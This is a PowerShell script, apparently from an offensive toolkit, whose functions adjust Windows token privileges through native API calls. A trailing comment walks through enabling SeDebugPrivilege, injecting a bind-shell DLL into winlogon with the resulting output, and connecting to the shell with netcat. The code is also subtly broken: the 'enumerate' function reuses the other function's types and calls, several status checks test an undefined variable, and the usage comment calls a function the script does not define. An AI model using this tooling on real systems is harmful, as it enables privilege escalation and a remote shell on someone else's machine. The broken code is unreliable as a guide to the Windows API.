function Enable-Privilege-PS {

	<#
    .SYNOPSIS
    Enables or disables a privilege for the current session complete PSH
	
	.DESCRIPTION

	.PARAMETER 

	.EXAMPLE
	
	.INPUTS
	System.String
	
	.OUTPUTS
	None

	.NOTES
    Privilege constants: https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
    Changing Privilege in tokens: https://docs.microsoft.com/en-us/windows/win32/secbp/changing-privileges-in-a-token
    
	.LINK
	
	#>
    [CmdletBinding()]
    [OutputType([String])]
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)] 
        [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege","SeDebugPrivilege", "SeEnableDelegationPrivilege","SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
        [string]$Privilege,
        [int32]$procID = $pid,
        [switch]$Disabled
    )
	Begin {
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;
    
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        };

        public static class WindowsAPIAddPrivilege
        {
            public const UInt32 TOKEN_QUERY = 0x0008;
            public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
            public const UInt32 TOKEN_ADJUST_BUNDLE = ( TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY );
            
            public const int SE_PRIVILEGE_ENABLED = 0x00000002;
            public const int SE_PRIVILEGE_DISABLED = 0x00000000;

            [DllImport("Kernel32.dll", SetLastError = true)]
            public static extern uint GetLastError();
    
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentProcess();
    
            [DllImport("Kernel32.dll", SetLastError = true)]
			public static extern IntPtr OpenProcess
			(
				UInt32 processAccess,
				bool bInheritHandle,
				int processId
            );

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenProcessToken
            (
                IntPtr h,
                uint acc,
                ref IntPtr phtok
            );
    
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool LookupPrivilegeValue
            (
                string host,
                string name,
                ref long pluid
            );

            [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
            public static extern bool AdjustTokenPrivileges
            (
                IntPtr htok, 
                bool disall,
                ref TokPriv1Luid newst, 
                int len, 
                IntPtr prev, 
                IntPtr relen
            );
        }
"@
	}
	Process {

        # Open the remote process
		# PROCESS_ALL_ACCESS = 0x1F0FFF
		# https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess
		#
		$handleProcess = [WindowsAPIAddPrivilege]::OpenProcess(0x1F0FFF,$false,$procID); $LastError = [WindowsAPIAddPrivilege]::GetLastError()
        Write-Host -Foregroundcolor White -NoNewLine "[+] Handle to current process ${procID}: "
        if($handleProcess -eq 0)
		{
            Write-Host -Foregroundcolor Red "Failed"
            Write-Host -Foregroundcolor White -NoNewline "[!] Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
            Write-Host -Foregroundcolor Green $handleProcess
        }


        # Open the process token
		# Access: TOKEN_DUPLICATE
        # https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        #
        # Declare our Int for handle to the token
        [IntPtr]$handleToken = [IntPtr]::Zero
		$returnValue = [WindowsAPIAddPrivilege]::OpenProcessToken($handleProcess, [WindowsAPIAddPrivilege]::TOKEN_ADJUST_BUNDLE, [ref]$handleToken); $LastError = [WindowsAPIAddPrivilege]::GetLastError()
        Write-Host -Foregroundcolor White -NoNewLine "[+] Handle to token for procID ${procID}: "
        if($handleToken -eq 0)
		{
            Write-Host -Foregroundcolor Red "Failed"
            Write-Host -Foregroundcolor White -NoNewline "[!] Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
            Write-Host -Foregroundcolor Green $handleToken
        }

        $tp = New-Object -TypeName TokPriv1Luid
        $tp.Count = 1;
        $tp.Luid = 0;
        $tpLuid = 0;
        $tp.Attr = If($Disabled) { [WindowsAPIAddPrivilege]::SE_PRIVILEGE_DISABLED } else { [WindowsAPIAddPrivilege]::SE_PRIVILEGE_ENABLED }
        $returnValue = [WindowsAPIAddPrivilege]::LookupPrivilegeValue($null, $Privilege, [ref] $tpLuid);
        $tp.Luid = $tpLuid
        $returnValue = [WindowsAPIAddPrivilege]::AdjustTokenPrivileges($handleToken, $false, [ref] $tp, 0, [IntPtr]::Zero, [IntPtr]::Zero);

        If($Disabled)
        {
            Write-Host -Foregroundcolor White -NoNewLine "[+] Disabling privilege ${Privilege} to procID ${procID}: "
        } else {
            Write-Host -Foregroundcolor White -NoNewLine "[+] Enabling privilege ${Privilege} to procID ${procID}: "
        }
        
        if($return -ne 0)
        {
            Write-Host -Foregroundcolor Green "Success"
        } else {
            Write-Host -Foregroundcolor Red "Failed $return, $lasterror"
        }
	}
	End {
	}
}

function Enum-Privilege-PS {

	<#
    .SYNOPSIS
    Enumerates privileges in the current process ID.
	
	.DESCRIPTION

	.PARAMETER 

	.EXAMPLE
	
	.INPUTS
	System.String
	
	.OUTPUTS
	None

	.NOTES
    Privilege constants: https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
    Changing Privilege in tokens: https://docs.microsoft.com/en-us/windows/win32/secbp/changing-privileges-in-a-token
    
	.LINK
	
	#>
    [CmdletBinding()]
    [OutputType([String])]
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)] 
        [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege","SeDebugPrivilege", "SeEnableDelegationPrivilege","SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
        [string]$Privilege,
        [int32]$procID = $pid
    )
	Begin {
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;
    
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct PRIVILEGE_SET
        {
            public uint PrivilegeCount;
            public uint Control;
            public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;
            public LUID_AND_ATTRIBUTES[] Privilege;
        };

        public static class WindowsAPICheckPrivilege
        {
            public const UInt32 TOKEN_QUERY = 0x0008;
            
            public const int SE_PRIVILEGE_ENABLED = 0x00000002;
            public const int SE_PRIVILEGE_DISABLED = 0x00000000;

            [DllImport("Kernel32.dll", SetLastError = true)]
            public static extern uint GetLastError();
    
            [DllImport("Kernel32.dll", SetLastError = true)]
			public static extern IntPtr OpenProcess
			(
				UInt32 processAccess,
				bool bInheritHandle,
				int processId
            );

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenProcessToken
            (
                IntPtr h,
                uint acc,
                ref IntPtr phtok
            );
    
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool LookupPrivilegeValue
            (
                string host,
                string name,
                ref long pluid
            );

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool PrivilegeCheck
            (
                IntPtr htok,
                ref PRIVILEGE_SET RequiredPrivileges,
                bool pfResult
            );
        }
"@
	}
	Process {

        # Open the remote process
		# PROCESS_ALL_ACCESS = 0x1F0FFF
		# https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess
		#
		$handleProcess = [WindowsAPIAddPrivilege]::OpenProcess(0x1F0FFF,$false,$procID); $LastError = [WindowsAPIAddPrivilege]::GetLastError()
        Write-Host -Foregroundcolor White -NoNewLine "[+] Handle to current process ${procID}: "
        if($handleProcess -eq 0)
		{
            Write-Host -Foregroundcolor Red "Failed"
            Write-Host -Foregroundcolor White -NoNewline "[!] Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
            Write-Host -Foregroundcolor Green $handleProcess
        }


        # Open the process token
		# Access: TOKEN_QUERY
        # https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        #
        # Declare our Int for handle to the token
        [IntPtr]$handleToken = [IntPtr]::Zero
		$returnValue = [WindowsAPIAddPrivilege]::OpenProcessToken($handleProcess, [WindowsAPIAddPrivilege]::TOKEN_QUERY, [ref]$handleToken); $LastError = [WindowsAPIAddPrivilege]::GetLastError()
        Write-Host -Foregroundcolor White -NoNewLine "[+] Handle to token for process ID ${procID}: "
        if($handleToken -eq 0)
		{
            Write-Host -Foregroundcolor Red "Failed"
            Write-Host -Foregroundcolor White -NoNewline "[!] Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
            Write-Host -Foregroundcolor Green $handleToken
        }

        $tp = New-Object -TypeName TokPriv1Luid
        $tp.Count = 1;
        $tp.Luid = 0;
        $tpLuid = 0;
        $tp.Attr = If($Disabled) { [WindowsAPIAddPrivilege]::SE_PRIVILEGE_DISABLED } else { [WindowsAPIAddPrivilege]::SE_PRIVILEGE_ENABLED }
        $returnValue = [WindowsAPIAddPrivilege]::LookupPrivilegeValue($null, $Privilege, [ref] $tpLuid);
        $tp.Luid = $tpLuid
        $returnValue = [WindowsAPIAddPrivilege]::AdjustTokenPrivileges($handleToken, $false, [ref] $tp, 0, [IntPtr]::Zero, [IntPtr]::Zero);

        If($Disabled)
        {
            Write-Host -Foregroundcolor White -NoNewLine "[+] Disabling privilege ${Privilege} to procID ${procID}: "
        } else {
            Write-Host -Foregroundcolor White -NoNewLine "[+] Enabling privilege ${Privilege} to procID ${procID}: "
        }
        
        if($return -ne 0)
        {
            Write-Host -Foregroundcolor Green "Success"
        } else {
            Write-Host -Foregroundcolor Red "Failed $return, $lasterror"
        }
	}
	End {
	}
}

#
# Abusing permissions
#

# SeDebugPrivilege
#
# 1). Grant the SeDebugPrivilege: Import-Module .\Abuse-permissions.ps1; Enable-Privilege -Privilege SeDebugPrivilege
# 2). Process-Injection-Method1 -processname winlogon -dll_path '.\Documents\PS and C# snippits\shell_bind_tcp_10000_x64.dll'
# [+] Process injection using Add-Type method:
# [+] Process ID of winlogon: 664
# [+] DLL path/filename in bytes: 46 92 68 111 99 117 109 101 110 116 115 92 80 83 32 97 110 100 32 67 35 32 115 110 105 112 112 105 116 115 92 115 104 101 108 108 95 98 105 110 100 95 116 99 112 95 49 48 48 48 48 95 120 54 52 46 100 108 108
# [+] Handle to winlogon/664 is: 780
# [+] Pointer to memory location for shellcode: 22D51F00000
# [+] Handle to Kernel32.dll: 140710319489024
# [+] Pointer to LoadLibraryA: 140710319616544
# [+] Handle to new thread in winlogon: 3100
# [+] Completed.
# nc 127.0.0.1 10000


